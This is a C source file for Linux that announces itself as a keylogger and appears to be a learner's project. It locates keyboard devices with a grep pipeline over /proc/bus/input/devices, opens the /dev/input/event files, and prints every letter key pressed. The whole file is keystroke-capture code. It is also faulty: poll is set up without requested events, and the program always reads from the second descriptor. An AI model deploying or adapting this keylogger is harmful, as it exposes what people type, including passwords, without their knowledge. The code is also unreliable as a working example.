#include <fcntl.h> // open()
#include <linux/input-event-codes.h>
#include <linux/input.h>
#include <stdio.h>
#include <string.h>
#include <sys/poll.h>
#include <unistd.h> // read()

const char *key_name(unsigned short code) {
  switch (code) {
  case KEY_A:
    return "A";
  case KEY_B:
    return "B";
  case KEY_C:
    return "C";
  case KEY_D:
    return "D";
  case KEY_E:
    return "E";
  case KEY_F:
    return "F";
  case KEY_G:
    return "G";
  case KEY_H:
    return "H";
  case KEY_I:
    return "I";
  case KEY_J:
    return "J";
  case KEY_K:
    return "K";
  case KEY_L:
    return "L";
  case KEY_M:
    return "M";
  case KEY_N:
    return "N";
  case KEY_O:
    return "O";
  case KEY_P:
    return "P";
  case KEY_Q:
    return "Q";
  case KEY_R:
    return "R";
  case KEY_S:
    return "S";
  case KEY_T:
    return "T";
  case KEY_U:
    return "U";
  case KEY_V:
    return "V";
  case KEY_W:
    return "W";
  case KEY_X:
    return "X";
  case KEY_Y:
    return "Y";
  case KEY_Z:
    return "Z";

  default:
    return "UNKNOWN";
  }
}
int main() {

  // identify keyboard device  - find the handler associated with the keyboard
  const char *cmd = "grep -E 'Handlers|EV=' /proc/bus/input/devices | grep -B1 "
                    "'EV=120013' | grep -Eo 'event[0-9]+'";
  // RUN THE LINUX COMMAND
  // popen returns a file pointer or a stream
  FILE *pipe = popen(cmd, "r");
  if (pipe == NULL) {
    perror("open failed!");
    return 1;
  }

  // 2d character array
  char events[5][128]; // store 5 events
  int event_count = 0;

  char buffer[128];
  while (fgets(buffer, sizeof(buffer), pipe) != NULL) {

    buffer[strcspn(buffer, "\n")] =
        '\0'; // removes newline, replace it with '\0'.
              // we dont want '\n', when later used like '/dev/input/eventX\n'
              // this \n becomes a files path will throw a error while
              // fetching keyboard event
    strcpy(events[event_count],
           buffer); // add available events to array from buffer.
    event_count++;
    // breakout loop
    if (event_count >= 5) {
      break;
    }
  }
  pclose(pipe);
  /*
for (int i=0; i <event_count; i++){
     printf("%s\n", events[i]);
}
printf("length of events in array: %d\n", event_count);
// got the events */

  // Now get stream of data from keyboard events
  struct pollfd fds[5];  // array to store file descriptors or streams
  struct input_event ev; // for working with /dev/input/eventX devices , struct
                         // input_event is the fundamental data structure
  char path[256];        // to build the path dynamically.
  printf("keylogger started...\n");

  // may be there are 2 keyboards so store each keyboard file as different
  // file descriptors.
  for (int i = 0; i < event_count; i++) {
    snprintf(path, sizeof(path), "/dev/input/%s",
             events[i]); // writes formatted output into a character buffer
    fds[i].fd = open(path, O_RDONLY);

    if (fds[i].fd == -1) {
      perror("cant open the event stream!");
      continue; // try the next event in the array
    }
  }

  while (1) {

    // Tell me which keyboard has data , so - use poll()  -- int poll(struct
    // pollfd *fds, nfds_t nfds, int timeout);
    int length_or_array = sizeof(fds) / sizeof(fds[0]);
    int which_event_num = poll(fds, length_or_array, 5000);
    // printf("which  %d\n", which_event_num);

    // read FDs
    read(fds[1].fd, &ev, sizeof(struct input_event));
    if (ev.type == EV_KEY && ev.value == 1) {
      printf(" pressed %s\n", key_name(ev.code));
      fflush(stdout);
    }
  }

  // close(fds);
  for (int i = 0; i < event_count; i++) {
    close(fds[i].fd);
  }

  return 0;
}
